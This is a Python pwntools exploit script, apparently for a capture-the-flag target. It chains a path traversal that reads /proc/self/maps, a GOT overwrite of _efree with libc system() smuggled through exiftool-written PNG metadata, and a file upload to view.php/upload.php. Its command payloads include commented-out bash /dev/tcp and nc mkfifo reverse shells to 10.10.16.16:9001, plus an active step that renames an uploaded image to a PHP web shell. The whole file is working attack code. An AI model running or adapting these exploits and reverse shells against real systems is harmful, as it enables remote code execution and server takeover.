#!/usr/bin/python3

from pwn import *
import re
import base64
import subprocess
import tempfile
import os
import requests

metadata_reader_elf = ELF("./metadata_reader.so", checksec=False)
libc = ELF("./libc_from_remote.so", checksec=False)
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# Configuration
# target_url = "localhost:8000"
target_url = "94.237.61.84:33900"
host = target_url.split(":")[0] 
port = int(target_url.split(":")[1])        

def leak_addresses(host, port):
    request = (
        f"GET /view.php?image=/../../../../proc/self/maps HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    conn = remote(host, port)
    conn.send(request)

    response = conn.recvall(timeout=5).decode(errors="replace")

    conn.close()

    match = re.search(r'data:image/png;base64,([^"]+)', response)
    if not match:
        log.error("Could not find Base64 data in the response.")
        return None, None

    b64_data = match.group(1)

    try:
        decoded_data = base64.b64decode(b64_data)
    except base64.binascii.Error as e:
        log.error(f"Base64 decoding failed: {e}")
        return None, None

    # with open("maps_decoded.txt", "wb") as f:
    #     f.write(decoded_data)

    libc_base = None
    so_base = None

    for line in decoded_data.decode(errors="replace").split('\n'):
        if 'libc.so.6' in line and 'r--p' in line and libc_base == None:
            parts = line.split()
            if len(parts) >= 6:
                addr_range = parts[0]
                libc_path = parts[-1]
                if 'libc.so.6' in libc_path:
                    libc_base_str = addr_range.split('-')[0]
                    try:
                        libc_base = int(libc_base_str, 16)
                        log.success(f"Found libc base: {libc_base_str} (0x{libc_base:x})")
                    except ValueError:
                        log.error(f"Invalid libc address format: {libc_base_str}")

        if 'metadata_reader.so' in line and 'r--p' in line and so_base == None:
            parts = line.split()
            if len(parts) >= 6:
                addr_range = parts[0]
                so_path = parts[-1]
                if 'metadata_reader.so' in so_path:
                    so_base_str = addr_range.split('-')[0]
                    try:
                        so_base = int(so_base_str, 16)
                        log.success(f"Found metadata_reader.so base: {so_base_str} (0x{so_base:x})")
                    except ValueError:
                        log.error(f"Invalid metadata_reader.so address format: {so_base_str}")

        if libc_base is not None and so_base is not None:
            break

    if libc_base is None or so_base is None:
        log.error("Could not find libc base address or metadata_reader.so base address in maps.")
        quit()

    return libc_base, so_base

def craft_png(got_address):

    print("Resetting my_pic.png first...")
    
    reset_png_command = [
        "exiftool",
        f"-Title={""}",
        f"-Artist={""}",
        f"-Copyright={""}",
        "./my_pic.png"
    ]

    result = subprocess.run(reset_png_command, capture_output=True, text=True)
    print("STDOUT: ", result.stdout)

    # command = b"/usr/bin/bash -i >& /dev/tcp/10.10.16.16/9001 0>&1"
    # command = b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.16 9001 >/tmp/f"
    command = b"cp ./uploads/m.png ./uploads/m.php"
    # command = b"cp ./uploads/rev.png ./uploads/rev.php"
    # command = b"cp ./uploads/weev.png ./uploads/weev.php"
    # command = b"ping 10.10.16.16"
    # command = b"touch bitch.txt"
    if len(command)+1 > 56: 
        print(f"Command is too long {len(command)+1}")
        quit()
    artist_data = command + b";" + ((56-(len(command)+1)) * b" ") + got_address
    title_data = command
    copyright_data = p64(libc.sym['system'])

    with tempfile.NamedTemporaryFile(delete=False) as title_file, \
        tempfile.NamedTemporaryFile(delete=False) as artist_file, \
        tempfile.NamedTemporaryFile(delete=False) as copyright_file:

        title_file.write(title_data)
        title_file.flush()

        artist_file.write(artist_data)
        artist_file.flush()

        copyright_file.write(copyright_data)
        copyright_file.flush()

        # exiftool commands
        cmdTitle = [
            "exiftool",
            f"-Title<={title_file.name}",
            "./my_pic.png"
        ]

        cmdCopyright = [
            "exiftool",
            f"-Copyright<={copyright_file.name}",
            "./my_pic.png"
        ]

        cmdArtist = [
            "exiftool",
            f"-Artist<={artist_file.name}",
            "./my_pic.png"
        ]

        # commands order
        commands = [
            cmdArtist,
            cmdTitle,
            cmdCopyright,
        ]

        for cmd in commands:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print("STDOUT: ", result.stdout)

        
        cp_png_command = [
            "cp",
            "./my_pic.png",
            "./uploads/my_pic.png"
        ]

        result = subprocess.run(cp_png_command, capture_output=True, text=True)
        print("STDOUT: ", result.stdout)

    # remove the temporary files
    os.remove(title_file.name)
    os.remove(artist_file.name)
    os.remove(copyright_file.name)

    return "./uploads/my_pic.png"

def upload_payload_png(host, port, file_path):
    url = f"http://{host}:{port}/upload.php"

    with open(file_path, "rb") as f:
        files = {"file": ("my_pic.png", f, "image/png")}
        response = requests.post(url, files=files)

    if response.status_code == 200:
        print("File uploaded successfully")
        print(response.text)
    else:
        print("Failed to upload file")
        print(response.text)

def exploit():
    libc_base, so_base = leak_addresses(host, port)
    if libc_base is not None:
        print(f"Libc Base Address: {hex(libc_base)}")

    if so_base is not None:
        print(f"metadata_reader.so Base Address: {hex(so_base)}")

    metadata_reader_elf.address = so_base
    libc.address = libc_base


    # get got:
    overwrite_got_target = metadata_reader_elf.got["_efree"]
    print(f"{hex(overwrite_got_target)=}")
    print(f"{hex(libc.sym['system'])=}")
    
    file_path = craft_png(p64(overwrite_got_target))
    upload_payload_png(host, port, file_path)

exploit()   